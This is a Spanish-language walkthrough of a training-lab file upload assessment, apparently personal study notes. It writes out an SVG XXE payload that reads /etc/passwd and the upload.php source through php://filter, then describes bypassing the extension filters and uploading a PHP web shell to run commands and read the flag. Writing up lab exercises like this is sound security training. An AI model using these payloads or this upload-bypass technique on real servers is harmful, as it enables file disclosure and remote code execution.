---
description: 'Target(s): 94.237.51.163:56227'
---

# File Upload Attacks

Le han contratado para realizar una pentest en la aplicación web de comercio electrónico de una empresa. La aplicación web está en sus primeras etapas, por lo que sólo probará los formularios de carga de archivos que pueda encontrar.

Intenta utilizar lo que has aprendido en este módulo para entender cómo funciona el formulario de carga y cómo saltarse varias validaciones (si las hay) para conseguir la ejecución remota de código en el servidor back-end.

## Extra Exercise

Intente anotar los principales problemas de seguridad detectados en la aplicación web y las medidas de seguridad necesarias para mitigarlos y evitar que sigan explotándose.

**Pregunta 1**: Intenta explotar el formulario de carga para leer la bandera que se encuentra en el directorio raíz /.

1. Rellenamos el formulario adjuntando una imagen y capturamos las request, enviamos al Repeater la de /contact/script.js:

<figure><img src="../../../../.gitbook/assets/image (422).png" alt=""><figcaption></figcaption></figure>

2. Desde el Repeater enviamos la request y nos responde con el contenido de script.js:

<figure><img src="../../../../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

3. Cómo necesitamos que el form haga uso del método POST lo cambiamos en el código fuente de la página:

<figure><img src="../../../../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

4. Capturamos la request en el Proxy y lo enviamos al Repeater:

<figure><img src="../../../../.gitbook/assets/image (425).png" alt=""><figcaption></figcaption></figure>

5. En el Repeater cambios el path donde se hace el POST a /contact/upload.php y enviamos la request, nos da la respuesta de que solamente se permiten imágenes:

<figure><img src="../../../../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>

6. Modificamos la request para que al hacer POST nos muestre el contenido de /etc/passwd:

```
POST /contact/upload.php HTTP/1.1
Host: 94.237.51.163:56227
Content-Type: multipart/form-data; boundary=12345
...
--12345
Content-Disposition: form-data; name="uploadFile"; filename="exploit.svg.jpg"
Content-Type: image/svg+xml
]>&xxe;
--12345--
```

<figure><img src="../../../../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

7. La response devuelve el contenido de /etc/passwd por lo que vemos que podemos usar esto en nuestro favor. Vamos a mostrar el contenido de upload.php encodeado en base64:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">
    <rect width="100%" height="100%" fill="blue"/>
    <text x="20" y="30">&xxe;</text>
</svg>
```

<figure><img src="../../../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>



* Código fuente cifrado en base64:

```
PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K
```

* Código fuente descifrado:

```
<?php
    require_once('./common-functions.php');
    
    // uploaded files directory
    $target_dir = "./user_feedback_submissions/";
    
    // rename before storing
    $fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
    $target_file = $target_dir . $fileName;
    
    // get content headers
    $contentType = $_FILES['uploadFile']['type'];
    $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
    
    // blacklist test
    if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
        echo "Extension not allowed";
        die();
    }
    
    // whitelist test
    if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
        echo "Only images are allowed";
        die();
    }
    
    // type test
    foreach (array($contentType, $MIMEtype) as $type) {
        if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
            echo "Only images are allowed";
            die();
        }
    }
    
    // size test
    if ($_FILES["uploadFile"]["size"] > 500000) {
        echo "File too large";
        die();
    }
    
    if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
        displayHTMLImage($target_file);
    } else {
        echo "File failed to upload";
    }
```

* En el código fuente se identifica el directorio de subidas: /user\_feedback\_submissions/ y el archivo se renombra como 250512\_archivo.php

8. Vamos a PayloadAllTheThings para una lista de extensiones PHP con las que podremos probar a bypassear el filtro de imágenes:

<figure><img src="../../../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

9. Confirmamos ejecutando en php la formula de fecha PHP para saber como guarda el nombre del archivo según el código fuente descifrado de upload.php:

<figure><img src="../../../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

10. Modificamos el POST añadiendo la línea con el resto del contenido de la request, y si vamos a la request de GET modificamos para que muestre el contenido del archivo que acabamos de subir:

<figure><img src="../../../../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>

11. Modificamos la request de POST de nuevo para probar con otra de las extensiones PHP para ver si se ejecuta el echo PHP que en la anterior no se ha ejecutado, solamente lo muestra como texto plano:

<figure><img src="../../../../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

12. Volvemos a enviar la request cambiando el nombre del archivo, lanzamos de nuevo la request del GET para ver si el código se ejecuta:

<figure><img src="../../../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

13. Comprobamos que esta vez si se ejecuta el echo de PHP, por lo que podremos ejecutar más código PHP con esta extensión. Ahora enviaremos en la request una shell PHP para ejecutar comandos de cmd:

<figure><img src="../../../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

14. Enviamos la request POST y volvemos a enviar la request GET, añadiendo al final del archivo el ?cmd=id para ver si funciona la ejecución de comandos:

<figure><img src="../../../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

15. Comprobamos que se pueden ejecutar correctamente los comandos, por lo que podemos utilizar comandos para encontrar la flag. Listamos el contenido de la raíz para ver cuál es el archivo flag:

<figure><img src="../../../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

16. Vemos que el archivo flag tiene un nombre extenso, lo copiamos, preparamos el comando en la request y la enviamos desde el Repeater y obtenemos la flag:

<figure><img src="../../../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

* Este laboratorio me costó bastante, partes en las que me quedé atascado pude solucionarlas siguiendo el siguiente vídeo: [https://www.youtube.com/watch?v=dVXA28y\_2Yo](https://www.youtube.com/watch?v=dVXA28y_2Yo)
